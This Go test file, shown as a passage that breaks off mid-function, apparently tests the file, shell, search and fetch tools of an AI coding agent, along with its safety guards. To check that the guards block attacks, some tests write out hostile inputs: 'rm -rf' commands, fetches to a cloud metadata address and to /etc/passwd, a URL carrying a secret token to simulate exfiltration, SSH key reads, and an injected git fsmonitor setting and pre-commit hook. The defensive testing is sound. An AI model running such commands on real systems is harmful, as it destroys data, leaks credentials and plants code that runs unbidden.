package tool

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"image"
	"image/png"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/tegarthegreat/agentium/internal/lsp"
	"github.com/tegarthegreat/agentium/internal/policy"
	"github.com/tegarthegreat/agentium/internal/sandbox"
)

func env(t *testing.T) *Env {
	t.Helper()
	dir := t.TempDir()
	dir, _ = filepath.EvalSymlinks(dir)
	return &Env{Root: dir, Gate: &policy.Gate{Mode: policy.Auto, Root: dir}}
}

func call(t *testing.T, tl Tool, e *Env, args string) (string, error) {
	t.Helper()
	return tl.Run(context.Background(), e, json.RawMessage(args))
}

func write(t *testing.T, e *Env, name, content string) {
	t.Helper()
	p := filepath.Join(e.Root, name)
	os.MkdirAll(filepath.Dir(p), 0o755)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestRead(t *testing.T) {
	e := env(t)
	write(t, e, "a.txt", "one\ntwo\nthree\nfour\n")
	out, err := call(t, readTool, e, `{"path":"a.txt"}`)
	if err != nil || out != "1\tone\n2\ttwo\n3\tthree\n4\tfour\n" {
		t.Fatalf("%q %v", out, err)
	}
	out, _ = call(t, readTool, e, `{"path":"a.txt","offset":2,"limit":2}`)
	if !strings.HasPrefix(out, "2\ttwo\n3\tthree\n") || !strings.Contains(out, "lines 2-3 of 4") {
		t.Fatalf("slice = %q", out)
	}
	out, _ = call(t, readTool, e, `{"path":"."}`)
	if !strings.Contains(out, "a.txt") {
		t.Fatalf("dir listing = %q", out)
	}
	write(t, e, "bin", "a\x00b")
	out, _ = call(t, readTool, e, `{"path":"bin"}`)
	if !strings.Contains(out, "binary") {
		t.Fatalf("binary = %q", out)
	}
	if _, err := call(t, readTool, e, `{"path":"missing"}`); err == nil {
		t.Fatal("want error for missing file")
	}
}

func TestEdit(t *testing.T) {
	e := env(t)
	if _, err := call(t, editTool, e, `{"path":"d/new.txt","new":"hello\nworld\n"}`); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(e.Root, "d/new.txt"))
	if string(b) != "hello\nworld\n" {
		t.Fatalf("created = %q", b)
	}
	if _, err := call(t, editTool, e, `{"path":"d/new.txt","old":"world","new":"there"}`); err != nil {
		t.Fatal(err)
	}
	b, _ = os.ReadFile(filepath.Join(e.Root, "d/new.txt"))
	if string(b) != "hello\nthere\n" {
		t.Fatalf("edited = %q", b)
	}
	write(t, e, "dup.txt", "x x x")
	if _, err := call(t, editTool, e, `{"path":"dup.txt","old":"x","new":"y"}`); err == nil || !strings.Contains(err.Error(), "3 times") {
		t.Fatalf("ambiguous edit: %v", err)
	}
	if out, err := call(t, editTool, e, `{"path":"dup.txt","old":"x","new":"y","all":true}`); err != nil || !strings.Contains(out, "3 places") {
		t.Fatalf("all: %q %v", out, err)
	}
	if _, err := call(t, editTool, e, `{"path":"dup.txt","old":"nope","new":"y"}`); err == nil {
		t.Fatal("want not-found error")
	}
	// Writing outside the workspace needs approval; there is no approver.
	if _, err := call(t, editTool, e, `{"path":"../escape.txt","new":"x"}`); err == nil || !strings.Contains(err.Error(), "denied") {
		t.Fatalf("outside write: %v", err)
	}
}

func TestEditParallelSameFile(t *testing.T) {
	e := env(t)
	var sb strings.Builder
	for i := 0; i < 20; i++ {
		fmt.Fprintf(&sb, "line%02d\n", i)
	}
	write(t, e, "f.txt", sb.String())
	done := make(chan error, 20)
	for i := 0; i < 20; i++ {
		go func(i int) {
			_, err := call(t, editTool, e, fmt.Sprintf(`{"path":"f.txt","old":"line%02d","new":"LINE%02d"}`, i, i))
			done <- err
		}(i)
	}
	for i := 0; i < 20; i++ {
		if err := <-done; err != nil {
			t.Fatal(err)
		}
	}
	b, _ := os.ReadFile(filepath.Join(e.Root, "f.txt"))
	if strings.Contains(string(b), "line") {
		t.Fatalf("lost updates:\n%s", b)
	}
}

func TestBash(t *testing.T) {
	e := env(t)
	out, err := call(t, bashTool, e, `{"cmd":"echo hi; echo err >&2; pwd"}`)
	if err != nil || !strings.Contains(out, "hi") || !strings.Contains(out, "err") || !strings.Contains(out, e.Root) {
		t.Fatalf("%q %v", out, err)
	}
	out, err = call(t, bashTool, e, `{"cmd":"echo nope; exit 3"}`)
	if err != nil || !strings.Contains(out, "[exit 3]") {
		t.Fatalf("exit code: %q %v", out, err)
	}
	t0 := time.Now()
	_, err = call(t, bashTool, e, `{"cmd":"sleep 5","timeout":1}`)
	if err == nil || time.Since(t0) > 4*time.Second {
		t.Fatalf("timeout: %v after %s", err, time.Since(t0))
	}
	out, _ = call(t, bashTool, e, `{"cmd":"seq 1 100000"}`)
	if len(out) > bashMaxOutput+400 || !strings.Contains(out, "omitted") || !strings.Contains(out, "100000\n[the full output (100000 lines) is in ") {
		t.Fatalf("clip: len=%d tail=%q", len(out), out[len(out)-120:])
	}
	spill := regexp.MustCompile(`is in (\S+):`).FindStringSubmatch(out)
	if full, err := os.ReadFile(spill[1]); err != nil || !strings.Contains(string(full), "\n50000\n") {
		t.Fatalf("spilled output: %v", err)
	}
	// Background child holding the pipe must not hang the tool.
	t0 = time.Now()
	if _, err := call(t, bashTool, e, `{"cmd":"sleep 30 & echo started"}`); err != nil || time.Since(t0) > 5*time.Second {
		t.Fatalf("background: %v after %s", err, time.Since(t0))
	}
	if _, err := call(t, bashTool, e, `{"cmd":"rm -rf /tmp/whatever"}`); err == nil || !strings.Contains(err.Error(), "denied") {
		t.Fatalf("risky command should be denied without approver: %v", err)
	}
}

func TestSearch(t *testing.T) {
	e := env(t)
	write(t, e, "src/main.go", "package main\nfunc Hello() {}\n")
	write(t, e, "src/util.go", "package main\nfunc helper() {}\n")
	write(t, e, "README.md", "hello docs\n")
	write(t, e, ".github/ci.yml", "run: func Hello\n")
	write(t, e, ".git/config", "func Hello in git internals\n")
	check := func(name string) {
		out, _ := call(t, searchTool, e, `{"pattern":"run: func"}`)
		if !strings.Contains(out, ".github/ci.yml") {
			t.Fatalf("%s: hidden files must be searched: %q", name, out)
		}
		if out, _ := call(t, searchTool, e, `{"pattern":"git internals"}`); out != "(no matches)" {
			t.Fatalf("%s: .git must be skipped: %q", name, out)
		}
		out, err := call(t, searchTool, e, `{"pattern":"func [Hh]el"}`)
		if err != nil || !strings.Contains(out, "src/main.go:2:") || !strings.Contains(out, "src/util.go:2:") {
			t.Fatalf("%s grep: %q %v", name, out, err)
		}
		out, _ = call(t, searchTool, e, `{"glob":"*.go"}`)
		if !strings.Contains(out, "src/main.go") || strings.Contains(out, "README") {
			t.Fatalf("%s glob: %q", name, out)
		}
		out, _ = call(t, searchTool, e, `{"pattern":"HELLO","ignore_case":true,"glob":"*.md"}`)
		if !strings.Contains(out, "README.md:1:") {
			t.Fatalf("%s icase: %q", name, out)
		}
		out, _ = call(t, searchTool, e, `{"pattern":"zzz_nothing"}`)
		if out != "(no matches)" {
			t.Fatalf("%s none: %q", name, out)
		}
	}
	check("default")
	// Force the pure-Go fallback.
	out, err := walkSearch(context.Background(), e.Root, e.Root, "func [Hh]el", "", false)
	if err != nil || !strings.Contains(out, "src/main.go:2:") || !strings.Contains(out, ".github/ci.yml") || strings.Contains(out, "internals") {
		t.Fatalf("fallback: %q %v", out, err)
	}
	out, _ = walkSearch(context.Background(), e.Root, e.Root, "", "src/**/*.go", false)
	if !strings.Contains(out, "src/util.go") {
		t.Fatalf("fallback glob: %q", out)
	}
}

func TestFetch(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, `<html><head><title>x</title><script>evil()</script></head><body><h1>Title</h1><p>Hello &amp; welcome</p><ul><li>one</li></ul></body></html>`)
	}))
	defer srv.Close()
	// httptest listens on 127.0.0.1, which is blocked by default.
	if _, err := call(t, fetchTool, env(t), fmt.Sprintf(`{"url":%q}`, srv.URL)); err == nil || !strings.Contains(err.Error(), "blocked") {
		t.Fatalf("loopback fetch must be blocked: %v", err)
	}
	for _, u := range []string{"http://169.254.169.254/latest/meta-data/", "http://10.0.0.1/", "http://[::1]:9/", "http://localhost:1/"} {
		if _, err := call(t, fetchTool, env(t), fmt.Sprintf(`{"url":%q}`, u)); err == nil || !strings.Contains(err.Error(), "blocked") {
			t.Fatalf("%s must be blocked: %v", u, err)
		}
	}
	e := env(t)
	e.AllowPrivateNet = true
	out, err := call(t, fetchTool, e, fmt.Sprintf(`{"url":%q}`, srv.URL))
	if err != nil || !strings.Contains(out, "# Title") || !strings.Contains(out, "Hello & welcome") || strings.Contains(out, "evil") || !strings.Contains(out, "untrusted") {
		t.Fatalf("%q %v", out, err)
	}
	if _, err := call(t, fetchTool, env(t), `{"url":"file:///etc/passwd"}`); err == nil {
		t.Fatal("non-http scheme must fail")
	}
}

func TestClip(t *testing.T) {
	s := strings.Repeat("a", 100)
	if Clip(s, 200) != s {
		t.Fatal("short strings unchanged")
	}
	c := Clip(strings.Repeat("x\n", 5000), 1000)
	if len(c) > 1100 || !strings.Contains(c, "omitted") {
		t.Fatalf("clip len %d", len(c))
	}
}

func TestSchemasAreValidJSON(t *testing.T) {
	for _, tl := range All() {
		if !json.Valid(tl.Def.Schema) {
			t.Fatalf("%s schema invalid", tl.Def.Name)
		}
	}
}

func TestEditGuards(t *testing.T) {
	e := env(t)
	write(t, e, "a.go", "package a\n")
	// Whole-file overwrite of an unread existing file is refused.
	if _, err := call(t, editTool, e, `{"path":"a.go","new":"oops"}`); err == nil || !strings.Contains(err.Error(), "read it first") {
		t.Fatalf("blind overwrite: %v", err)
	}
	call(t, readTool, e, `{"path":"a.go"}`)
	if _, err := call(t, editTool, e, `{"path":"a.go","new":"package a\n\nvar X = 1\n"}`); err != nil {
		t.Fatalf("overwrite after read: %v", err)
	}
	// Changed behind the agent's back: must re-read.
	time.Sleep(10 * time.Millisecond)
	write(t, e, "a.go", "package a\n\nvar X = 2 // edited by user\n")
	if _, err := call(t, editTool, e, `{"path":"a.go","old":"var X","new":"var Y"}`); err == nil || !strings.Contains(err.Error(), "changed on disk") {
		t.Fatalf("stale edit: %v", err)
	}
	call(t, readTool, e, `{"path":"a.go"}`)
	if _, err := call(t, editTool, e, `{"path":"a.go","old":"var X","new":"var Y"}`); err != nil {
		t.Fatalf("edit after re-read: %v", err)
	}
	// Consecutive own edits don't trip the stale check.
	if _, err := call(t, editTool, e, `{"path":"a.go","old":"var Y","new":"var Z"}`); err != nil {
		t.Fatalf("second own edit: %v", err)
	}
}

func TestBeforeMutateOncePerTurn(t *testing.T) {
	e := env(t)
	var n int32
	var mu sync.Mutex
	e.BeforeMutate = func() { mu.Lock(); n++; mu.Unlock(); time.Sleep(50 * time.Millisecond) }
	e.StartTurn()
	done := make(chan struct{})
	for i := 0; i < 5; i++ {
		go func(i int) {
			call(t, editTool, e, fmt.Sprintf(`{"path":"f%d.txt","new":"x"}`, i))
			done <- struct{}{}
		}(i)
	}
	for i := 0; i < 5; i++ {
		<-done
	}
	call(t, readTool, e, `{"path":"f0.txt"}`) // reads never checkpoint
	if n != 1 {
		t.Fatalf("BeforeMutate ran %d times in one turn", n)
	}
	e.StartTurn()
	call(t, bashTool, e, `{"cmd":"true"}`)
	if n != 2 {
		t.Fatalf("new turn should checkpoint again, got %d", n)
	}
}

func TestBashSandbox(t *testing.T) {
	if !sandbox.Probe().Available {
		t.Skip(sandbox.Probe().Detail)
	}
	e := env(t)
	outside, _ := filepath.EvalSymlinks(t.TempDir())
	e.Sandbox = &sandbox.Config{Write: []string{e.Root, "/dev"}}
	out, err := call(t, bashTool, e, `{"cmd":"echo hi > in.txt && cat in.txt"}`)
	if err != nil || !strings.Contains(out, "hi") {
		t.Fatalf("inside write: %q %v", out, err)
	}
	out, _ = call(t, bashTool, e, fmt.Sprintf(`{"cmd":"echo x > %s/out.txt"}`, outside))
	if !strings.Contains(out, "[exit") || !strings.Contains(out, "[sandbox:") {
		t.Fatalf("outside write should fail with a sandbox hint: %q", out)
	}
	if _, err := os.Stat(filepath.Join(outside, "out.txt")); err == nil {
		t.Fatal("file written outside the sandbox")
	}
	// net=true needs approval; with no approver it is denied.
	if _, err := call(t, bashTool, e, `{"cmd":"true","net":true}`); err == nil || !strings.Contains(err.Error(), "network denied") {
		t.Fatalf("net without approval: %v", err)
	}
	e.Net = policy.NetAllow
	if _, err := call(t, bashTool, e, `{"cmd":"true","net":true}`); err != nil {
		t.Fatalf("net allowed by policy: %v", err)
	}
	e.Net = policy.NetDeny
	e.Gate.SetMode(policy.Yolo)
	if _, err := call(t, bashTool, e, `{"cmd":"true","net":true}`); err == nil {
		t.Fatal("deny policy wins even in yolo mode")
	}
}

func TestEditFuzzyAndLint(t *testing.T) {
	e := env(t)
	write(t, e, "m.go", "package m\n\nfunc F() int {\n\tif true {\n\t\treturn 1\n\t}\n\treturn 0\n}\n")
	call(t, readTool, e, `{"path":"m.go"}`)
	// Model used spaces instead of tabs: indentation-tolerant match, and the
	// replacement is re-indented to the file's style.
	out, err := call(t, editTool, e, `{"path":"m.go","old":"    if true {\n        return 1\n    }","new":"    if false {\n        return 2\n    }"}`)
	if err != nil || !strings.Contains(out, "indentation") {
		t.Fatalf("fuzzy indent: %q %v", out, err)
	}
	b, _ := os.ReadFile(filepath.Join(e.Root, "m.go"))
	if !strings.Contains(string(b), "\tif false {\n\t\treturn 2\n\t}") {
		t.Fatalf("reindent wrong:\n%s", b)
	}
	// Syntax-breaking edit is rejected and the file is left untouched.
	before, _ := os.ReadFile(filepath.Join(e.Root, "m.go"))
	if _, err := call(t, editTool, e, `{"path":"m.go","old":"return 0\n}","new":"return 0\n"}`); err == nil || !strings.Contains(err.Error(), "syntax error") {
		t.Fatalf("lint gate: %v", err)
	}
	after, _ := os.ReadFile(filepath.Join(e.Root, "m.go"))
	if string(before) != string(after) {
		t.Fatal("rejected edit modified the file")
	}
	// Broken new file is rejected too.
	if _, err := call(t, editTool, e, `{"path":"bad.json","new":"{\"a\":"}`); err == nil {
		t.Fatal("invalid new JSON file should be rejected")
	}
	// A file that was already broken can still be edited (with a warning).
	write(t, e, "broken.go", "package b\nfunc (\n")
	call(t, readTool, e, `{"path":"broken.go"}`)
	if out, err := call(t, editTool, e, `{"path":"broken.go","old":"package b","new":"package c"}`); err != nil || !strings.Contains(out, "warning") {
		t.Fatalf("editing broken file: %q %v", out, err)
	}
	// CRLF files accept LF-only old/new and keep CRLF.
	write(t, e, "w.txt", "a\r\nb\r\nc\r\n")
	call(t, readTool, e, `{"path":"w.txt"}`)
	if out, err := call(t, editTool, e, `{"path":"w.txt","old":"a\nb","new":"x\ny"}`); err != nil || !strings.Contains(out, "CRLF") {
		t.Fatalf("crlf: %q %v", out, err)
	}
	if b, _ := os.ReadFile(filepath.Join(e.Root, "w.txt")); string(b) != "x\r\ny\r\nc\r\n" {
		t.Fatalf("crlf result %q", b)
	}
	// Trailing-whitespace tolerant.
	write(t, e, "t.txt", "one  \ntwo\t\nthree\n")
	call(t, readTool, e, `{"path":"t.txt"}`)
	if out, err := call(t, editTool, e, `{"path":"t.txt","old":"one\ntwo","new":"1\n2"}`); err != nil || !strings.Contains(out, "trailing") {
		t.Fatalf("trailing ws: %q %v", out, err)
	}
	// Ambiguous fuzzy match is refused.
	write(t, e, "amb.txt", "  x\n  y\n\tx\n\ty\n")
	call(t, readTool, e, `{"path":"amb.txt"}`)
	if _, err := call(t, editTool, e, `{"path":"amb.txt","old":"x\ny","new":"z"}`); err == nil {
		t.Fatal("ambiguous fuzzy match must fail")
	}
}

func TestDiffStat(t *testing.T) {
	for _, c := range []struct {
		a, b     string
		add, del int
	}{
		{"a\nb\nc\n", "a\nX\nc\n", 1, 1},
		{"a\nb\n", "a\nb\nc\nd\n", 2, 0},
		{"", "x\ny\n", 3, 0},
		{"a\nb\nc\n", "a\n", 0, 2},
	} {
		add, del := diffStat(c.a, c.b)
		if add != c.add || del != c.del {
			t.Errorf("%q→%q = +%d -%d, want +%d -%d", c.a, c.b, add, del, c.add, c.del)
		}
	}
}

func TestPostEditHook(t *testing.T) {
	e := env(t)
	// Portable in-place rewrite (BSD sed -i needs a suffix argument).
	e.PostEdit = []string{"t=$(sed 's/TODO/DONE/' {path}) && printf '%s\\n' \"$t\" > {path}", "grep -q forbidden {path} && echo 'lint: forbidden word' && exit 1 || true"}
	out, err := call(t, editTool, e, `{"path":"n.txt","new":"TODO item\n"}`)
	if err != nil || strings.Contains(out, "hook") {
		t.Fatalf("clean hook run: %q %v", out, err)
	}
	b, _ := os.ReadFile(filepath.Join(e.Root, "n.txt"))
	if string(b) != "DONE item\n" {
		t.Fatalf("formatter hook not applied: %q", b)
	}
	// The hook's own change must not make the next edit look stale.
	if _, err := call(t, editTool, e, `{"path":"n.txt","old":"DONE item","new":"forbidden item"}`); err != nil {
		t.Fatalf("edit after hook: %v", err)
	}
	out, _ = call(t, editTool, e, `{"path":"n.txt","old":"forbidden item","new":"forbidden thing"}`)
	if !strings.Contains(out, "lint: forbidden word") {
		t.Fatalf("failing hook output should reach the model: %q", out)
	}
}

func TestSymlinkEscapeAndSecretSearch(t *testing.T) {
	e := env(t)
	outside, _ := filepath.EvalSymlinks(t.TempDir())
	os.WriteFile(filepath.Join(outside, "victim.txt"), []byte("safe"), 0o644)
	os.Symlink(outside, filepath.Join(e.Root, "h"))
	if _, err := call(t, editTool, e, `{"path":"h/victim.txt","old":"safe","new":"pwned"}`); err == nil || !strings.Contains(err.Error(), "outside workspace") {
		t.Fatalf("symlinked write must be treated as outside: %v", err)
	}
	if _, err := call(t, editTool, e, `{"path":"h/new.txt","new":"x"}`); err == nil {
		t.Fatal("new file through symlink must be denied")
	}
	if b, _ := os.ReadFile(filepath.Join(outside, "victim.txt")); string(b) != "safe" {
		t.Fatal("file outside workspace modified")
	}
	// Credential stores: search refuses them and skips them inside wider searches.
	home := filepath.Join(e.Root, "home")
	os.MkdirAll(filepath.Join(home, ".ssh"), 0o700)
	os.WriteFile(filepath.Join(home, ".ssh", "id_rsa"), []byte("PRIVATE KEY material"), 0o600)
	if _, err := call(t, searchTool, e, `{"pattern":"PRIVATE","path":"home/.ssh"}`); err == nil {
		t.Fatal("search in .ssh must need approval")
	}
	if out, _ := call(t, searchTool, e, `{"pattern":"PRIVATE","path":"home"}`); strings.Contains(out, "material") {
		t.Fatalf("wide search leaked a key: %q", out)
	}
	if out, _ := walkSearch(context.Background(), e.Root, home, "PRIVATE", "", false); strings.Contains(out, "material") {
		t.Fatalf("fallback search leaked a key: %q", out)
	}
	// A single huge line is shown truncated rather than as nothing.
	write(t, e, "min.js", strings.Repeat("x", readMaxBytes+500))
	out, _ := call(t, readTool, e, `{"path":"min.js"}`)
	if !strings.Contains(out, "line truncated") || len(out) < readMaxBytes {
		t.Fatalf("huge line: len=%d", len(out))
	}
}

func TestSafeDialAllowsConfiguredProxy(t *testing.T) {
	// A local forward proxy (corporate or sandbox proxies) must stay
	// reachable even though it is on loopback; targets are still checked
	// by checkHost before the request and on redirects.
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Skip(err)
	}
	defer ln.Close()
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			c.Close()
		}
	}()
	addr := ln.Addr().String()
	if _, err := safeDial(context.Background(), "tcp", addr); err == nil {
		t.Fatal("loopback must be blocked when it is not the proxy")
	}
	t.Setenv("HTTPS_PROXY", "http://"+addr)
	c, err := safeDial(context.Background(), "tcp", addr)
	if err != nil {
		t.Fatalf("configured proxy must be dialable: %v", err)
	}
	c.Close()
	if err := checkHost(context.Background(), "127.0.0.1"); err == nil {
		t.Fatal("private targets stay blocked behind a proxy")
	}
}

func TestPlanMode(t *testing.T) {
	e := env(t)
	e.Gate.SetMode(policy.Plan)
	os.WriteFile(filepath.Join(e.Root, "a.txt"), []byte("one\n"), 0o644)
	call(t, readTool, e, `{"path":"a.txt"}`)
	if _, err := call(t, editTool, e, `{"path":"a.txt","old":"one","new":"two"}`); err == nil || !strings.Contains(err.Error(), "plan mode") {
		t.Fatalf("edit in plan mode: %v", err)
	}
	// Without a sandbox only read-only commands run.
	if out, err := call(t, bashTool, e, `{"cmd":"cat a.txt"}`); err != nil || !strings.Contains(out, "one") {
		t.Fatalf("read-only bash: %q %v", out, err)
	}
	if _, err := call(t, bashTool, e, `{"cmd":"touch b.txt"}`); err == nil || !strings.Contains(err.Error(), "plan mode") {
		t.Fatalf("mutating bash without sandbox: %v", err)
	}
	if !sandbox.Probe().Available {
		return
	}
	// With a sandbox any command runs, but the workspace is read-only.
	e.Sandbox = &sandbox.Config{Write: sandbox.DefaultWrite(e.Root)}
	out, err := call(t, bashTool, e, `{"cmd":"touch b.txt; echo done"}`)
	if err != nil || !strings.Contains(out, "done") {
		t.Fatalf("sandboxed plan bash: %q %v", out, err)
	}
	if _, err := os.Stat(filepath.Join(e.Root, "b.txt")); err == nil {
		t.Fatal("plan mode wrote to the workspace")
	}
	if _, err := call(t, bashTool, e, `{"cmd":"rm -rf ."}`); err == nil {
		t.Fatal("risky command allowed in plan mode")
	}
}

func TestOutlineAndSymbol(t *testing.T) {
	e := env(t)
	os.MkdirAll(filepath.Join(e.Root, "pkg"), 0o755)
	os.WriteFile(filepath.Join(e.Root, "pkg", "a.go"), []byte("package pkg\n\ntype Svc struct{}\n\nfunc (s *Svc) Start() error {\n\treturn nil\n}\n"), 0o644)
	os.WriteFile(filepath.Join(e.Root, "b.py"), []byte("class Svc:\n    def start(self):\n        pass\n"), 0o644)
	os.WriteFile(filepath.Join(e.Root, "notes.md"), []byte("# Svc"), 0o644)

	out, err := call(t, readTool, e, `{"path":"pkg/a.go","outline":true}`)
	if err != nil || !strings.Contains(out, "5: func (s *Svc) Start() error") || strings.Contains(out, "return nil") {
		t.Fatalf("file outline: %q %v", out, err)
	}
	// An outline is not a full read: overwriting still needs a real read.
	if _, err := call(t, editTool, e, `{"path":"pkg/a.go","new":"package pkg\n"}`); err == nil {
		t.Fatal("outline must not count as having read the file")
	}
	out, _ = call(t, readTool, e, `{"path":".","outline":true}`)
	if !strings.Contains(out, "== b.py (4 lines)\n1: class Svc") || !strings.Contains(out, "== pkg/a.go") || strings.Contains(out, "notes.md") || strings.Contains(out, "def start") {
		t.Fatalf("dir outline: %q", out)
	}
	out, _ = call(t, searchTool, e, `{"symbol":"Svc.Start"}`)
	if strings.TrimSpace(out) != "pkg/a.go:5: func (s *Svc) Start() error" {
		t.Fatalf("symbol: %q", out)
	}
	out, _ = call(t, searchTool, e, `{"symbol":"Svc"}`)
	if !strings.Contains(out, "b.py:1: class Svc") || !strings.Contains(out, "pkg/a.go:3: type Svc struct") {
		t.Fatalf("symbol Svc: %q", out)
	}
	if _, err := call(t, readTool, e, `{"path":"notes.md","outline":true}`); err == nil {
		t.Fatal("unsupported outline should error")
	}
}

func TestReadImage(t *testing.T) {
	e := env(t)
	var buf bytes.Buffer
	png.Encode(&buf, image.NewRGBA(image.Rect(0, 0, 3, 2)))
	os.WriteFile(filepath.Join(e.Root, "shot.png"), buf.Bytes(), 0o644)
	os.WriteFile(filepath.Join(e.Root, "fake.png"), []byte("not an image at all"), 0o644)

	out, err := call(t, readTool, e, `{"path":"shot.png"}`)
	if err != nil || !strings.Contains(out, "cannot view images") {
		t.Fatalf("no vision: %q %v", out, err)
	}
	e.Vision = true
	ctx, imgs := WithImageSink(context.Background())
	out, err = readTool.Run(ctx, e, json.RawMessage(`{"path":"shot.png"}`))
	if err != nil || !strings.Contains(out, "image/png") || !strings.Contains(out, "3x2") {
		t.Fatalf("vision read: %q %v", out, err)
	}
	if got := imgs(); len(got) != 1 || got[0].MediaType != "image/png" || !bytes.Equal(got[0].Data, buf.Bytes()) {
		t.Fatalf("attached: %+v", got)
	}
	// A .png that is not an image is read as a file.
	if out, _ := readTool.Run(ctx, e, json.RawMessage(`{"path":"fake.png"}`)); !strings.Contains(out, "not an image") {
		t.Fatalf("fake png: %q", out)
	}
}

func TestRefsTreeAndIndexCache(t *testing.T) {
	e := env(t)
	e.CodeCache = filepath.Join(t.TempDir(), "codemap.gob")
	os.MkdirAll(filepath.Join(e.Root, "svc", "deep", "er"), 0o755)
	os.WriteFile(filepath.Join(e.Root, "svc", "a.go"), []byte("package svc\n\nfunc Load() int { return 1 }\n\n// Load is documented here\nfunc Use() int {\n\treturn Load() + Loader()\n}\n"), 0o644)
	os.WriteFile(filepath.Join(e.Root, "main.py"), []byte("from svc import Load\n\nclass App:\n    def run(self):\n        return Load()\n"), 0o644)
	os.WriteFile(filepath.Join(e.Root, "svc", "deep", "er", "x.txt"), []byte("x"), 0o644)

	out, err := call(t, searchTool, e, `{"refs":"Load"}`)
	if err != nil || !strings.HasPrefix(out, "3 reference(s) in 2 file(s)") ||
		!strings.Contains(out, "svc/a.go:7 [in Use]: return Load() + Loader()") ||
		!strings.Contains(out, "main.py:5 [in App.run]: return Load()") ||
		strings.Contains(out, "func Load") || strings.Contains(out, "documented") {
		t.Fatalf("refs: %q %v", out, err)
	}
	if _, err := os.Stat(e.CodeCache); err != nil {
		t.Fatal("index not cached on disk")
	}
	// A changed file is re-indexed; a fresh Env reuses the disk cache.
	os.WriteFile(filepath.Join(e.Root, "svc", "b.go"), []byte("package svc\n\nfunc Extra() { Load() }\n"), 0o644)
	e2 := &Env{Root: e.Root, CodeCache: e.CodeCache}
	if out, _ := call(t, searchTool, e2, `{"refs":"Load"}`); !strings.Contains(out, "svc/b.go:3 [in Extra]") {
		t.Fatalf("refs after change: %q", out)
	}
	if out, _ := call(t, searchTool, e2, `{"symbol":"Extra","path":"svc"}`); strings.TrimSpace(out) != "svc/b.go:3: func Extra()" {
		t.Fatalf("symbol in subdir: %q", out)
	}

	out, err = call(t, readTool, e, `{"path":"."}`)
	if err != nil || !strings.Contains(out, "svc/\n  deep/ (1 files)\n  a.go\n  b.go\nmain.py") {
		t.Fatalf("tree: %q %v", out, err)
	}
}

func TestSearchMemory(t *testing.T) {
	e := env(t)
	if out, _ := call(t, searchTool, e, `{"memory":"flaky test"}`); out != "(memory is off)" {
		t.Fatalf("no recall: %q", out)
	}
	e.Recall = func(q string) string { return "hit for " + q }
	if out, _ := call(t, searchTool, e, `{"memory":"flaky test"}`); out != "hit for flaky test" {
		t.Fatalf("recall: %q", out)
	}
}

func TestGitGuardAndEnvScrub(t *testing.T) {
	e := env(t)
	exec.Command("git", "init", "-q", e.Root).Run()
	t.Setenv("SUPER_SECRET_TOKEN", "do-not-leak-this-value")
	out, _ := call(t, bashTool, e, `{"cmd":"env | grep -c do-not-leak-this-value; true"}`)
	if !strings.HasPrefix(strings.TrimSpace(out), "0") {
		t.Fatalf("secret reached the shell: %q", out)
	}
	out, _ = call(t, bashTool, e, `{"cmd":"git config core.fsmonitor 'touch pwned' && printf '#!/bin/sh\ntouch pwned\n' > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit && git config user.name tester"}`)
	if !strings.Contains(out, "undid .git/config") || !strings.Contains(out, "new hook .git/hooks/pre-commit") {
		t.Fatalf("guard report: %q", out)
	}
	cfg, _ := os.ReadFile(filepath.Join(e.Root, ".git", "config"))
	if strings.Contains(string(cfg), "fsmonitor") {
		t.Fatal("fsmonitor survived")
	}
	if _, err := os.Stat(filepath.Join(e.Root, ".git", "hooks", "pre-commit")); err == nil {
		t.Fatal("hook survived")
	}
	// Harmless config changes stay.
	out, _ = call(t, bashTool, e, `{"cmd":"git config user.email a@b.c"}`)
	cfg, _ = os.ReadFile(filepath.Join(e.Root, ".git", "config"))
	if strings.Contains(out, "undid") || !strings.Contains(string(cfg), "a@b.c") {
		t.Fatalf("harmless change undone: %q", out)
	}
	if _, err := call(t, fetchTool, e, `{"url":"https://example.com/?t=do-not-leak-this-value"}`); err == nil || !strings.Contains(err.Error(), "credential") {
		t.Fatalf("fetch exfil: %v", err)
	}
}

func TestReadNonRegularAndLarge(t *testing.T) {
	e := env(t)
	if _, err := call(t, readTool, e, `{"path":"/dev/zero"}`); err == nil || !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("/dev/zero: %v", err)
	}
	big := filepath.Join(e.Root, "big.log")
	f, _ := os.Create(big)
	line := strings.Repeat("x", 99) + "\n"
	for i := 0; i < 90000; i++ { // ~9 MB
		f.WriteString(line)
	}
	f.WriteString("THE END\n")
	f.Close()
	out, err := call(t, readTool, e, `{"path":"big.log","offset":90001,"limit":5}`)
	if err != nil || !strings.Contains(out, "lines 90001-90001 shown") || !strings.Contains(out, "THE END") {
		t.Fatalf("large read: %q %v", out[:min(len(out), 200)], err)
	}
}

func TestUnchangedRereadAndAtomicWrite(t *testing.T) {
	e := env(t)
	p := filepath.Join(e.Root, "a.txt")
	os.WriteFile(p, []byte("one\ntwo\n"), 0o640)
	first, _ := call(t, readTool, e, `{"path":"a.txt"}`)
	again, _ := call(t, readTool, e, `{"path":"a.txt"}`)
	if !strings.Contains(first, "one") || !strings.Contains(again, "unchanged since you read it") {
		t.Fatalf("reread: %q", again)
	}
	if out, _ := call(t, readTool, e, `{"path":"a.txt","offset":2}`); !strings.Contains(out, "two") {
		t.Fatal("a different range must be served")
	}
	if _, err := call(t, editTool, e, `{"path":"a.txt","old":"one","new":"uno"}`); err != nil {
		t.Fatal(err)
	}
	if out, _ := call(t, readTool, e, `{"path":"a.txt"}`); !strings.Contains(out, "uno") {
		t.Fatalf("changed file must be served in full: %q", out)
	}
	call(t, readTool, e, `{"path":"a.txt"}`)
	e.ForgetReads()
	if out, _ := call(t, readTool, e, `{"path":"a.txt"}`); !strings.Contains(out, "uno") {
		t.Fatal("after ForgetReads the content must be served again")
	}
	st, _ := os.Stat(p)
